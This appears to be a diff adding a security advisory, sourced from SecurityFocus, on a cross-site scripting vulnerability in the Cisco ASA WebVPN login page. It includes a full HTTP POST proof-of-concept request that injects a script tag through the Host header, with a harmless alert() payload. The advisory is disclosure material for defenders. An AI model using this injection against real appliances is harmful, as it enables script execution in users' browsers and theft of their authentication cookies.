@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/34307/info
+
+Cisco ASA is prone to a cross-site scripting vulnerability.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to steal cookie-based authentication credentials.
+
+Cisco ASA software versions 8.0.4(2B) and prior running on ASA 5500 Series Adaptive Security Appliances are vulnerable. 
+
+POST /+webvpn+/index.html HTTP/1.1
+Host: "'><script>alert('BugsNotHugs')</script><meta httpequiv=""
+content='"www.example.org
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+application/x-shockwave-flash, application/vnd.ms-excel,
+application/vnd.ms-powerpoint, application/msword, */*
+Referer: https://www.example.com/+webvpn+/index.html
+Accept-Language: en-us
+Content-Type: application/x-www-form-urlencoded
+UA-CPU: x86
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/1.3 (compatible; MSIE 3.0; Windows 3.11; .NET CLR 1.1.1032)
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: webvpnlogin=1
+Content-Length: 66
+
+username=psirt&password=easy&Login=Login&next=&tgroup=&tgcookieset= 
